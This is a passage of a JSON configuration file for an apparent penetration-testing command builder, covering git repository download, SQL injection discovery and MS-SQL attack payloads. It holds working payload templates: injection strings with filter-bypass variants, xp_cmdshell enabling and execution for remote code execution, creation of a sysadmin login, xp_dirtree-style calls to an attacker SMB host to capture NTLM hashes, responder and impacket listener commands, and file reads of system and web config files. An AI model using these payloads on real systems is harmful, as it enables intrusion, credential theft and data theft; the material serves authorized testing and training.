          },
          {
            "help": "This is the full path on the filesystem to the location of the git repository",
            "replace": "__GIT_DIRECTORY_PATH__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Git directory absolute path"
            }
          },
          {
            "help": "Git log will show a list of commits, hashes, dates, authors and messages by default. Git log does not show the filenames changed, or the amount of lines added/removed. This flag will enable showing the filenames and some additional stats like the lines changed/deleted.",
            "replace": "__GIT_LOG_STAT__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable showing filenames (--stat flag) in git log",
              "replaceValue": " --stat"
            }
          },
          {
            "help": "Git commit id aka hash are sha-1 hashes that can uniquely identify a given commit. If another commit is identical, then the hash will also be identical - allowing for comparison of two commits efficiently.\n\nSome git commands by default will show the most recent commit info, and then optionally accept a commit hash.\n\nSome examples include:\n\n1. `8e0b187`\n2. `8e0b1871dfb67685903d8ca02d3468ca671452bf`\n\nBoth of these will reference the same commit, the first one is a 'short' hash - typically 7 characters long, while the second is the full commit hash of 40 characters. Short hashes can be used as there is an extremely low chance of collision.",
            "replace": "__GIT_HASH__",
            "defaultValue": "",
            "validationRegex": "\\b[0-9a-fA-F]{5,40}\\b",
            "validationHelp": "expected a hexadecmial string from 5 to 40 characters long",
            "props": {
              "type": "string",
              "label": "Git hash (hexadecimal string)"
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "Download Git Repo",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "__GIT_DL_COMMAND__",
        "help": "Downloading a git repo from an web server is a potential on a pentest. This command helps do this quickly using common tools.",
        "code": [],
        "config": [
          {
            "help": "To download a git repository from a webserver, there are two suggested steps.\n\n1. make a directory to contain the contents and cd into that directory\n2. download the contents\n\nThis approach has the advantage of easy cleanup if the download command doesn't work or some other issue happens that requires deleting of the downloaded content.",
            "replace": "__GIT_DL_COMMAND__",
            "defaultValue": "mkdir -p '__GIT_DL_LOCAL_DIR__' && cd '__GIT_DL_LOCAL_DIR__'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "mkdir -p '__GIT_DL_LOCAL_DIR__' && cd '__GIT_DL_LOCAL_DIR__'",
                  "label": "Step 1: mkdir and cd"
                },
                {
                  "replace": "wget -r --no-parent '__GIT_DL_PROTO__://__GIT_DL_HOST__/__GIT_DL_PATH__'",
                  "label": "Step 2: Download via wget"
                }
              ],
              "label": "Select a step"
            }
          },
          {
            "help": "",
            "replace": "__GIT_DL_PROTO__",
            "defaultValue": "http",
            "props": {
              "type": "select",
              "label": "Select protocol",
              "customInput": false,
              "options": ["http", "https"]
            }
          },
          {
            "help": "",
            "replace": "__GIT_DL_HOST__",
            "defaultValue": "__TARGET_HOST__:__TARGET_PORT__",
            "props": {
              "type": "select",
              "label": "Hostname + port to connect to",
              "customInput": true,
              "options": ["__TARGET_HOST__:__TARGET_PORT__", "localhost:1080"]
            }
          },
          {
            "help": "This is the path on the server to the `.git` folder. This allows for entering sub-folders and any custom name of a `.git` folder.",
            "replace": "__GIT_DL_PATH__",
            "defaultValue": ".git/",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Path to the .git folder"
            }
          },
          {
            "help": "This is the local (eg on Kali) directory path (relative or absolute) to store the contents of the wget download command.",
            "replace": "__GIT_DL_LOCAL_DIR__",
            "defaultValue": "repo1",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Enter the local directory path to create"
            }
          }
        ]
      }
    ]
  },
  {
    "id": "sql-injection",
    "keywords": [
      "sqli",
      "mssql",
      "mysql",
      "postgresql",
      "database",
      "microsoft",
      "ntlm hash",
      "responder",
      "impacket-smbserver"
    ],
    "cmds": [
      {
        "win": 2,
        "label": "Sqli Discovery",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__SQLI_STEP__",
        "help": "# Discovering Sqli vulnerabilities\n\nThe commands built here are designed to be inserted into an Html form or made via tools like `burpsuite` or `curl` to make an HTTP request. These commands are designed to identify if a given parameter is vulnerable to sqli, the type of vulnerabilities that may be possible which will lead to finally moving into more offensive sqli payloads.\n\n",
        "code": [],
        "config": [
          {
            "help": "# SQLi concepts\n\nLinks from some of the best resources on the web:\n\n- [PortSwigger aka Burpsuite SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)\n- [HackTricks xyz SQLi Cheat Sheet](https://book.hacktricks.xyz/pentesting-web/sql-injection#entry-point-detection)\n- [Pentest Monkey SQLi Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)\n- [eMVee Github Mindmap on Web Pentesting](https://raw.githubusercontent.com/eMVee-NL/MindMap/main/image/Mindmap%20Web%20Application%20Pentesting.png)\n\n## Error based detection\n\nIf some input a pentester supplies can cause an sql error, then it's likely that sql injection exists. Often it's best to approach this in two steps:\n\n1. cause an sql error, read the error output (if available) to gain more insight\n2. update the input that previously caused an error, to now work properly, given extra sql syntax\n\n### Error based example and workflow\n\nA basic query to select a name from a users database table, with the input of `the password here` could look like:\n\n```sql\nSELECT user_name FROM users_table WHERE user_password = 'the password here';\n```\nIf the input of `the password here` is not properly inserted into this query, then sqli should be possible. Without going into too many details of specific programming languages, here is an example of the final query when it's constructed improperly with an input of `that's an error`:\n\n```sql\nSELECT user_name FROM users_table WHERE user_password = 'that's an error';\n```\n> NOTE: the `'` (single quote) in the input ended the quote so the WHERE clause is looking to match on the condition `user_password = 'that'` while the rest of the input gives an error because `s an error';` is not valid sql syntax. Due to the syntax error caused, the query will not attempt to even run but the error message caused can be quite useful.\n\nNow that an error is caused, even if no error output is shown, further testing should be attempted to see if a different response from the server is apparent. To do this additional input should be added to the previous query, or at a minimum, keeping the parts that cause the error are necessary. In this example the single quote `'` is causing the error, none of the other text would matter (with only a single quote there is still a syntax error due to an odd number of quotes in the query - among other syntax errors).\n\nTweaking the input to be `that' and '1' = '1` should not cause an error as the query will now look like:\n\n```sql\nSELECT user_name FROM users_table WHERE user_password = 'that' and '1' = '1';\n```\n> NOTE: There are now an even number of single quotes. Also the word `and` is typically a reserved keyword within SQL query languages, which is a logical AND statement allowing for further clauses to be added to the WHERE clause. In this case the test of `'1' = '1'` is being tested, which will always be TRUE. This can be changed to `'1' = '0'` to always be FALSE to see how the query behaves differently - For this example query this might help identify an sqli using a TRUE and FALSE statement as there might be different messages on a login page showing 'user not found' vs 'login failed'. It's also a good idea to try using `or` instead of `and` to see different responses.\n\nNow that different responses are being shown due to sql errors vs no sql errors vs logical tests it's much more likely that sql injection would be possible to exploit. A finding like this should be looked into further with additional tests such as the `UNION tests` or the `ORDER BY tests`. Further, it might only be possible to find a `BLIND sql injection` which means no output is given but time delays or throwing errors can be used for confirmation of a successful or failed query.\n\n## UNION based detection\n\nAnother test for sql injection is to try a UNION based sql injection test. This uses a common feature of SQL query languages where a statement can be joined to another statement. This is powerful as it can allow for things like uploading a webshell or dumping of the data within a database table.\n\nThe steps for successfully performing a UNION sqli attack are:\n\n1. find the number of columns to avoid a syntax error\n2. attempt with NULL, string or number inputs to potentially match the column data types\n3. attempt to select a canary value and find it in the output\n\n### UNION SELECT example steps\n\nTo find the column count execute the following query, if it errors reduce the number until no errors happen. Consider reducing the number by half to find success faster, before narrowing in on the maximum number which doesn't cause an error. The input supplied to this query is `2 ORDER BY 99`, where ` ORDER BY 99` is the value to tweak until no errors are shown. If this input doesn't cause an error try `9999` and other very large values to cause an error.\n\n```sql\nSELECT info FROM mytable WHERE id=2 ORDER BY 99;\n```\nIn this example the input of `2 ORDER BY 1` would not error where `2 ORDER BY 2` would error as only 1 column is being selected in the original select statement.\n\nNow try to determine the type of column data being returned. This is often text-type data but it can be of any type the database and server-side programming language(s) support. Now it's important to look for both errors and changes in the output to determine the answers.\n\n```sql\n-- NOTE: supplying null can be useful to be sure the keywords UNION SELECT aren't somehow being filtered by a web application firewall (waf) or by other means\nSELECT info FROM mytable WHERE id=2 UNION SELECT null;\n\n-- selecting some text, which might be displayed in the output aka a canary string!\nSELECT info FROM mytable WHERE id=2 UNION SELECT 'sometext';\n\n-- selecting a number\nSELECT info FROM mytable WHERE id=2 UNION SELECT 2;\n\n-- selecting a boolean\nSELECT info FROM mytable WHERE id=2 UNION SELECT true;\n\n-- selecting a DATE\nSELECT info FROM mytable WHERE id=2 UNION SELECT DATE('2024-01-29');\n```\n> NOTE: Consider the previous examples the simplest way to highlight detecting column data types. It's especially useful if this info is somehow returned in the output (the most useful being a string show in the output, with a number value being the second most useful)\n\nAttempting to find a canary string in a UNION based sql query looks like:\n\n```sql\nSELECT info FROM mytable WHERE id=2 UNION SELECT 'testcanaryblaslkfs';\n```\nThen in the output (typically from the web application html output or api response) search for the canary string of `testcanaryblaslkfs`. If this is present, then the query successfully returned data from an sql injection.\n\n> Moving on: Now that a UNION SELECT query is working, trying something like uploading a webshell or enumerating the database version, database names, table names and more should be attempted. Often the more info enumerated the more context the pentester has the better an attack can be performed. It also can help a report to highlight impact given knowledge that was previously unknown.\n\n## Blind sqli detection (Time-based and/or Error-based)\n\nSometimes no output is shown but sql injection is still possible. This is often considered the most difficult of the sql injection attacks as feedback is extremely limited and consumes a large amount of time. Often this is the most common attack to perform in an automated fashion, so consider brushing up on some python or learning how to automate burpsuite requests using the intruder tab.\n\nTime-based blind sqli works on a simple principle; construct a query that if a condition is met, cause the query to delay for a period of time. Otherwise, if the condition isn't met, do NOT delay.\n\nError-based blind sqli works on the idea that if a condition is met, the query should be successful and if a condition isn't met then cause an error.\n\nBoth Time and Error based blind attacks would need to be tested to attempt to prove if a blind sqli attack exists. Sometimes out-of-band-attacks are used to help speed up these attack as well. Out-of-band-attacks use approaches like creating an SMB connection to the attacking computer to send data or simply make a connection - either can help prove that an sqli attack is possible. Whenever possible, attempt sqli that will give the most information possible to speed up the pentest and give the best chance at success.\n\n\n",
            "replace": "__SQLI_STEP__",
            "defaultValue": "__SQLI_TEST_ERROR__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__SQLI_TEST_ERROR__",
                  "label": "Attempt to find sqli through causing an sql syntax error"
                },
                {
                  "replace": "__SQL_TEST_COLUMNS__",
                  "label": "ORDER BY / GROUP BY column count test"
                },
                {
                  "replace": "__SQL_TEST_UNION__",
                  "label": "UNION SELECT column count test"
                },
                {
                  "replace": "__SQL_TEST_TIME_BLIND__",
                  "label": "Time-based BLIND tests"
                },
                {
                  "replace": "__SQL_TEST_ERROR_BLIND__",
                  "label": "Error-based BLIND tests"
                }
              ],
              "label": "Select an SQLi test"
            }
          },
          {
            "help": "",
            "replace": "__SQL_QUOTE__",
            "defaultValue": "'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "'",
                  "label": "Single quote (')"
                },
                {
                  "replace": "\"",
                  "label": "Double quote (\"\")"
                },
                {
                  "replace": "`",
                  "label": "Backtick (`)"
                },
                {
                  "replace": "\\'",
                  "label": "Escape quote (\\')"
                },
                {
                  "replace": "\\\"\"",
                  "label": "Escape double quote (\\\")"
                },
                {
                  "replace": "\\`",
                  "label": "Escape backtick (\\`)"
                }
              ],
              "label": "Select quote literal"
            }
          },
          {
            "help": "If an sql injection exists, often it can be found by causing a syntax error in a query. Try injecting these options and more as a payload to cause an sql syntax error. Ideally the application will output some info about the error to give more context, tho this is not ideal for the application maintainers!",
            "replace": "__SQLI_TEST_ERROR__",
            "defaultValue": "'",
            "props": {
              "type": "select",
              "label": "Syntax error testing",
              "customInput": true,
              "options": [
                "'",
                "\"",
                "`",
                "')",
                "'))",
                "\")",
                "\"))",
                "`)",
                "`))",
                "';",
                "\";"
              ]
            }
          },
          {
            "help": "",
            "replace": "__SQL_TEST_UNION__",
            "defaultValue": "__SQL_QUOTE__ UNION SELECT 'canarystringtestingasdfas'__SQL_COMMENT__",
            "props": {
              "type": "select",
              "label": "UNION SELECT sqli payload",
              "customInput": true,
              "options": [
                "__SQL_QUOTE__ UNION SELECT 'canarystringtestingasdfas'__SQL_COMMENT__"
              ]
            }
          },
          {
            "help": "",
            "replace": "__SQL_COMMENT__",
            "defaultValue": "--",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "--",
                  "label": "double hyphen (can apply to: MySQL, PostgreSQL, MSSQL, Oracle, SQLite)"
                },
                {
                  "replace": "-- ",
                  "label": "double hyphen with space (may only be required for MySQL)"
                },
                {
                  "replace": "#",
                  "label": "hashtag (can apply to MySQL)"
                },
                {
                  "replace": "/*",
                  "label": "slash-star (can apply to most all DBs)"
                },
                {
                  "replace": "/*! ",
                  "label": "slash-star-bang (can apply to MySql)"
                },
                {
                  "replace": "__BLANK__",
                  "label": "NO COMMENT (__BLANK__)"
                }
              ],
              "label": "Select an SQL comment"
            }
          },
          {
            "help": "",
            "replace": "__SQL_TEST_COLUMNS__",
            "defaultValue": "__SQL_QUOTE__ ORDER BY __SQL_COLUMN_COUNT__ __SQL_COMMENT__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__SQL_QUOTE__ ORDER BY __SQL_COLUMN_COUNT__ __SQL_COMMENT__",
                  "label": "Test 1: ORDER BY number"
                },
                {
                  "replace": "__SQL_QUOTE__ GROUP BY __SQL_COLUMN_COUNT__ __SQL_COMMENT__",
                  "label": "Test 2: GROUP BY number"
                },
                {
                  "replace": "__SQL_QUOTE__ OrDer bY __SQL_COLUMN_COUNT__ __SQL_COMMENT__",
                  "label": "Test 3: OrDer bY simple obfuscation bypass"
                },
                {
                  "replace": "__SQL_QUOTE__ gRoUp bY __SQL_COLUMN_COUNT__ __SQL_COMMENT__",
                  "label": "Test 4: gRoUp bY simple obfuscation bypass"
                },
                {
                  "replace": "__SQL_QUOTE__ O/*-*/RD/*-*/ER B/*-*/Y __SQL_COLUMN_COUNT__ __SQL_COMMENT__",
                  "label": "Test 5: ORDER BY Comment obfuscation bypass"
                },
                {
                  "replace": "__SQL_QUOTE__ G/*-*/RO/*-*/UP B/*-*/Y __SQL_COLUMN_COUNT__ __SQL_COMMENT__",
                  "label": "Test 6: GROUP BY Comment obfuscation bypass"
                }
              ],
              "label": "ORDER/GROUP BY column count test"
            }
          },
          {
            "help": "",
            "replace": "__SQL_TEST_TIME_BLIND__",
            "defaultValue": "__SQL_QUOTE__ + sleep(10) __SQL_COMMENT__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__SQL_QUOTE__ + sleep(10) __SQL_COMMENT__",
                  "label": "Mysql #1: string concat + sleep"
                },
                {
                  "replace": "__SQL_QUOTE__ and sleep(10) __SQL_COMMENT__",
                  "label": "Mysql #2: string concat and sleep"
                },
                {
                  "replace": "__SQL_QUOTE__ && sleep(10) __SQL_COMMENT__",
                  "label": "Mysql #3: string concat && sleep"
                },
                {
                  "replace": "__SQL_QUOTE__ | sleep(10) __SQL_COMMENT__",
                  "label": "Mysql #4: string concat | sleep"
                },
                {
                  "replace": "__SQL_QUOTE__ || pg_sleep(10) __SQL_COMMENT__",
                  "label": "PostgreSQL string concat || pg_sleep"
                },
                {
                  "replace": "__SQL_QUOTE__ WAITFOR DELAY '0:0:10' __SQL_COMMENT__",
                  "label": "MSSQL WAITFOR DELAY"
                }
              ],
              "label": "Time-Based Blind Tests"
            }
          },
          {
            "help": "All of these examples should throw an error as the logical statement being tested is set to False. If this is possible then sqli should be possible - at least using an Error-based Blind sqli approach.",
            "replace": "__SQL_TEST_ERROR_BLIND__",
            "defaultValue": "__SQL_QUOTE__ SELECT CASE WHEN (1=0) THEN 1/0 ELSE NULL END __SQL_COMMENT__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__SQL_QUOTE__ SELECT CASE WHEN (1=0) THEN 1/0 ELSE NULL END __SQL_COMMENT__",
                  "label": "MSSQL Select Case When"
                },
                {
                  "replace": "__SQL_QUOTE__ AND 1 = (SELECT CASE WHEN (1=0) THEN 1/(SELECT 0) ELSE NULL END) __SQL_COMMENT__",
                  "label": "PostgreSQL Select Case When"
                },
                {
                  "replace": "__SQL_QUOTE__ UNION SELECT IF(1=0,(SELECT table_name FROM information_schema.tables),'a') __SQL_COMMENT__",
                  "label": "MySQL  Select IF"
                }
              ],
              "label": "Error-based Blind Tests"
            }
          },
          {
            "help": "",
            "replace": "__SQL_COLUMN_COUNT__",
            "defaultValue": 99,
            "props": {
              "type": "number",
              "label": "Column Count",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 999
                }
              }
            }
          }
        ]
      },
      {
        "win": 1,
        "label": "Attacker Tools",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": false,
        "cmd": "__SMB_NTLM_HASH_STEALING__",
        "help": "# Purpose\n\nThis contains some useful tools when performing certain attacks.\n\n## SMB NTLM hash stealing\n\nUsing `responder` or `impacket-smbserver` a pentester can setup a listener to steal the NTLM authentication hash from a server that attempts to connect to the box running these attacking tools. This can often be found in an MSSQL injection attack where the Sql server has some of the `xp_dirtree` or other stored procedures enabled in the current context.",
        "code": [],
        "config": [
          {
            "help": "Select a tool to configure for this attack.",
            "replace": "__SMB_NTLM_HASH_STEALING__",
            "defaultValue": "sudo responder -I __RESPONDER_INTERFACE__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "sudo responder -I __RESPONDER_INTERFACE__",
                  "label": "Responder"
                },
                {
                  "replace": "sudo impacket-smbserver __IMPACKET_SHARENAME__ '__IMPACKET_SHAREPATH__'__IMPACKET_ENABLE_TIMESTAMPS____IMPACKET_ENABLE_SMB2__ -ip __IMPACKET_IPV4_HOST____IMPACKET_ENABLE_DEBUG__ -port __IMPACKET_SMB_PORT__",
                  "label": "Impacket-Smbserver"
                }
              ],
              "label": "Select an attack tool"
            }
          },
          {
            "help": "To find the interface name, use something like `ip a` or other networking tools to see what interface names. Often this will be the name of the VPN tunnel interface for a lab network which is connected specifically for this pentest. Custom text is enabled to supply any value necessary",
            "replace": "__RESPONDER_INTERFACE__",
            "defaultValue": "tun0",
            "props": {
              "type": "select",
              "label": "Responder Network Interface name",
              "customInput": true,
              "options": ["tun0", "eth0", "wlan0", "tun1", "eth1", "wlan1"]
            }
          },
          {
            "help": "Name of the share which impacket will serve, aka the ShareName.",
            "replace": "__IMPACKET_SHARENAME__",
            "defaultValue": "sharename",
            "validationRegex": ".{1,}",
            "validationHelp": "At least one character is required",
            "props": {
              "type": "string",
              "label": "Impacket SMB Share Name"
            }
          },
          {
            "help": "give a path to a local folder on the attacking machine to share for this smb share. Often this is selected as the current directory aka `./` however this can be an absolute or relative path to any other folder. Ensure the folder exists\n\n> TIP: Consider using `mkdir` to create a new directory just for this task",
            "replace": "__IMPACKET_SHAREPATH__",
            "defaultValue": "./",
            "props": {
              "type": "select",
              "label": "Impacket Local Folder to Share",
              "customInput": true,
              "options": ["./"]
            }
          },
          {
            "help": "",
            "replace": "__IMPACKET_ENABLE_TIMESTAMPS__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable timestamps on each log",
              "replaceValue": " -ts"
            }
          },
          {
            "help": "",
            "replace": "__IMPACKET_ENABLE_SMB2__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable SMB2 Support",
              "replaceValue": " -smb2support"
            }
          },
          {
            "help": "",
            "replace": "__IMPACKET_IPV4_HOST__",
            "defaultValue": "__ATTACKER_HOST__",
            "props": {
              "type": "select",
              "label": "Enter the IPv4 Address to host the impacket-smbserver",
              "customInput": true,
              "options": ["0.0.0.0", "__ATTACKER_HOST__"]
            }
          },
          {
            "help": "",
            "replace": "__IMPACKET_ENABLE_DEBUG__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Impacket Enable Debug",
              "replaceValue": " -debug"
            }
          },
          {
            "help": "",
            "replace": "__IMPACKET_SMB_PORT__",
            "defaultValue": 445,
            "props": {
              "type": "number",
              "label": "Impacket SMB Port Number",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          }
        ]
      },
      {
        "win": 2,
        "label": "MS-SQL injection",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__MSSQL_STEP__",
        "help": "# Microsoft (MS) SQL injection\n\n[HackTricks XYZ - MS-SQLi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#tricks)\n\nMS-SQL is common to find in a pentest. The commands that are built with this utility are intended to be the payload within a burpsuite request, curl request or some other delivery method. As the delivery method is outside the scope of the sqli itself, only the sql payload is created here.\n\n",
        "code": [],
        "config": [
          {
            "help": "Choose either enumeration payloads or offensive (attack) payloads.",
            "replace": "__MSSQL_STEP__",
            "defaultValue": "__MSSQL_START_STATEMENT____MSSQL_ENUMERATION____MSSQL_END_STATEMENT__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__MSSQL_START_STATEMENT____MSSQL_ENUMERATION____MSSQL_END_STATEMENT__",
                  "label": "Enumeration and Discovery"
                },
                {
                  "replace": "__MSSQL_START_STATEMENT____MSSQL_OFFENSIVE____MSSQL_END_STATEMENT__",
                  "label": "Offensive Payloads (eg RCE)"
                }
              ],
              "label": "Select Sqli Payload Type"
            }
          },
          {
            "help": "# Enumeration\n\nThese attempt to find information that will lead to the next steps for attacking the mssql server.\n\n\n> NOTE: Any query for testing a permission *may* be subject to false-negative results, and as such the attack itself should be the standard by which to ensure the attack won't work. Be warned that running an attack command may result in undesired results - do NOT run any enumeration or attack against an environment without prior approval!",
            "replace": "__MSSQL_ENUMERATION__",
            "defaultValue": "select @@version;",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "select @@version;",
                  "label": "get mssql server version"
                },
                {
                  "replace": "select user_name();",
                  "label": "get database username"
                },
                {
                  "replace": "SELECT name FROM master.dbo.sysdatabases;",
                  "label": "get database names"
                },
                {
                  "replace": "SELECT TABLE_NAME FROM __MSSQL_DATABASE_NAME__.INFORMATION_SCHEMA.TABLES;",
                  "label": "get table name(s) for a given database"
                },
                {
                  "replace": "use master;EXEC sp_linkedservers;",
                  "label": "get Trusted Linked Servers"
                },
                {
                  "replace": "Use master;EXEC sp_helpsrvrolemember __MSSQL_QUOTE__sysadmin__MSSQL_QUOTE__;",
                  "label": "get users with sysadmin role"
                },
                {
                  "replace": "Use master;EXEC sp_helprotect __MSSQL_QUOTE__xp_cmdshell__MSSQL_QUOTE__;",
                  "label": "get users that can run xp_cmdshell for RCE"
                },
                {
                  "replace": "Use master;EXEC sp_helprotect __MSSQL_QUOTE__xp_dirtree__MSSQL_QUOTE__;",
                  "label": "get users that can run xp_dirtree for NTLM SMB theft"
                },
                {
                  "replace": "Use master;EXEC sp_helprotect __MSSQL_QUOTE__xp_subdirs__MSSQL_QUOTE__;",
                  "label": "get users that can run xp_subdirs for NTLM SMB theft"
                },
                {
                  "replace": "Use master;EXEC sp_helprotect __MSSQL_QUOTE__xp_fileexist__MSSQL_QUOTE__;",
                  "label": "get users that can run xp_fileexist for NTLM SMB theft"
                }
              ],
              "label": "Enumeration Options"
            }
          },
          {
            "help": "# Offensive Options\n\nThese can be harmful to the system under test. Ensure all laws and pen-testing guidelines are followed.\n\n## xp_cmdshell RCE (remote code execution)\n\nOne of the more common ways for MSSQL Rce and is well known to be a problematic SP for database admins - it's usually disabled in production environments (but not always...)\n\nThis stored procedure (sp_) allows for executing shell commands on the server hosting the database. Not every configuration will have this allowed or enabled, however when it's found it's very powerful. This will often lead to attacks such as a reverse shell.",
            "replace": "__MSSQL_OFFENSIVE__",
            "defaultValue": "__MSSQL_START_STATEMENT__EXEC sp_configure __MSSQL_QUOTE__show advanced options__MSSQL_QUOTE__,__MSSQL_QUOTE__1__MSSQL_QUOTE__;RECONFIGURE;EXEC sp_configure __MSSQL_QUOTE__xp_cmdshell__MSSQL_QUOTE__,__MSSQL_QUOTE__1__MSSQL_QUOTE__;RECONFIGURE;__MSSQL_END_STATEMENT__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "__MSSQL_START_STATEMENT__EXEC sp_configure __MSSQL_QUOTE__show advanced options__MSSQL_QUOTE__,__MSSQL_QUOTE__1__MSSQL_QUOTE__;RECONFIGURE;EXEC sp_configure __MSSQL_QUOTE__xp_cmdshell__MSSQL_QUOTE__,__MSSQL_QUOTE__1__MSSQL_QUOTE__;RECONFIGURE;__MSSQL_END_STATEMENT__",
                  "label": "Enable xp_cmdshell for RCE"
                },
                {
                  "replace": "__MSSQL_START_STATEMENT__EXEC master..xp_cmdshell __MSSQL_QUOTE____MSSQL_RCE_CMD____MSSQL_QUOTE__;",
                  "label": "Execute xp_cmdshell command (RCE)"
                },
                {
                  "replace": "CREATE LOGIN __MSSQL_NEW_USER__ WITH PASSWORD = __MSSQL_QUOTE____MSSQL_NEW_PASSWORD____MSSQL_QUOTE__;EXEC sp_addsrvrolemember __MSSQL_QUOTE____MSSQL_NEW_USER____MSSQL_QUOTE__, __MSSQL_QUOTE__sysadmin__MSSQL_QUOTE__;",
                  "label": "Create user with Sysadmin privs"
                },
                {
                  "replace": "EXEC sp_execute_external_script @language = N__MSSQL_QUOTE__Python__MSSQL_QUOTE__, @script = N__MSSQL_QUOTE____MSSQL_PYTHON_CMD____MSSQL_QUOTE__;",
                  "label": "Execute Python script"
                },
                {
                  "replace": "EXEC master..xp_dirtree __MSSQL_QUOTE__\\\\__MSSQL_ATTACKER_HOSTNAME__\\__MSSQL_SMB_PATH____MSSQL_QUOTE__",
                  "label": "Steal NTLM from SMB connection (xp_dirtree)"
                },
                {
                  "replace": "EXEC master..xp_subdirs __MSSQL_QUOTE__\\\\__MSSQL_ATTACKER_HOSTNAME__\\__MSSQL_SMB_PATH____MSSQL_QUOTE__",
                  "label": "Steal NTLM from SMB connection (xp_subdirs)"
                },
                {
                  "replace": "EXEC master..xp_fileexist __MSSQL_QUOTE__\\\\__MSSQL_ATTACKER_HOSTNAME__\\__MSSQL_SMB_PATH____MSSQL_QUOTE__",
                  "label": "Steal NTLM from SMB connection (xp_fileexist)"
                },
                {
                  "replace": "SELECT thisisthefilecontentscolumnuniquename FROM OPENROWSET(BULK N__MSSQL_QUOTE____MSSQL_FILE_READ_PATH____MSSQL_QUOTE__, SINGLE_CLOB) AS thisisthefilecontentscolumnuniquename",
                  "label": "Arbitrary File Read on Database Host Filesystem"
                }
              ],
              "label": "Offensive Options (aka RCE)"
            }
          },
          {
            "help": "SMB path which should be caught by `responder` or another NTLM Hash stealing tool eg `impacket-smbserver`\n\nOften this can be any valid string of characters, generally for opsec it's best to try something believable and common in the environment of the pentest - eg `accounting`.",
            "replace": "__MSSQL_SMB_PATH__",
            "defaultValue": "anything/",
            "props": {
              "type": "select",
              "label": "SMB Path to connect to on Kali/Attacker",
              "customInput": true,
              "options": ["anything/", "accounting/", "path/to/another/"]
            }
          },
          {
            "help": "The hostname or IPv4 of the Attacker box (aka kali) to use when connecting via SMB or other outbound commands from the SQLi query.\n\nThe default is the configured global `__ATTACKER_HOST__` IPv4 address but for flexibility on a pentest this configuration allows for any other valid FQDN or IPv4 or even IPv6 (if supported in the environment)",
            "replace": "__MSSQL_ATTACKER_HOSTNAME__",
            "defaultValue": "__ATTACKER_HOST__",
            "props": {
              "type": "select",
              "label": "Attacker Hostname or IPv4",
              "customInput": true,
              "options": ["__ATTACKER_HOST__"]
            }
          },
          {
            "help": "Arbitrary file read is very useful for further enumeration of a system and/or to gain knowledge of information for privesc.\n\nThis can be confirmed via attempting to read contents of common files, which if returned confirms the file read ability. The next step is to start attempting to find other juicy files like ssh keys, passwords, website config files and more.\n\n> NOTE: Test several file paths before concluding this is disabled, it's possible the context of the user doesn't have the necessary permissions to read from some of the system default file locations.",
            "replace": "__MSSQL_FILE_READ_PATH__",
            "defaultValue": "C:/Windows/System32/drivers/etc/hosts",
            "props": {
              "type": "select",
              "label": "Path for file to read",
              "customInput": true,
              "options": [
                "C:/Windows/System32/drivers/etc/hosts",
                "C:/inetpub/wwwroot/web.config",
                "/etc/passwd",
                "/etc/hosts"
              ]
            }
          },
          {
            "help": "",
            "replace": "__MSSQL_NEW_PASSWORD__",
            "defaultValue": "P@ssword123!",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Password when creating a new SQL user"
            }
          },
          {
            "help": "",
            "replace": "__MSSQL_NEW_USER__",
            "defaultValue": "hacker",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Username when creating new SQL user"
            }
          },
          {
            "help": "This is inserted at the BEGINNING of the payload, where necessary for the given command. Often this is the text `';` or any other context that escapes the existing query eg `' UNION SELECT ...`",
            "replace": "__MSSQL_START_STATEMENT__",
            "defaultValue": "'; ",
            "props": {
              "type": "select",
              "label": "Statement to prepend to SQLi payload",
              "customInput": true,
              "options": ["'; ", "\"; ", "' UNION ", "' UNION SELECT "]
            }
          },
          {
            "help": "The statement to append to the END of the Sqli payload. Often this is a comment to stop the rest of the parent sql statement from running eg `; -- #`",
            "replace": "__MSSQL_END_STATEMENT__",
            "defaultValue": " -- #",
            "props": {
              "type": "select",
              "label": "Statement to append to SQLi payload",
              "customInput": true,
              "options": [" -- #", "; -- #", "; -- ", "; -- // "]
            }
          },
          {
            "help": "When choosing a quote character be aware that commands that include RCE or other quoted values may conflict and cause an SQL syntax error. This tool has yet to come up with the proper solution to this problem. As such, options are given to avoid this where possible. Still it's the responsibility of the pentest professional to understand how to use these tools.",
            "replace": "__MSSQL_QUOTE__",
            "defaultValue": "'",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "'",
                  "label": "Single Quote '"
                },
                {
                  "replace": "\"",
                  "label": "Double Quote \""
                }
              ],
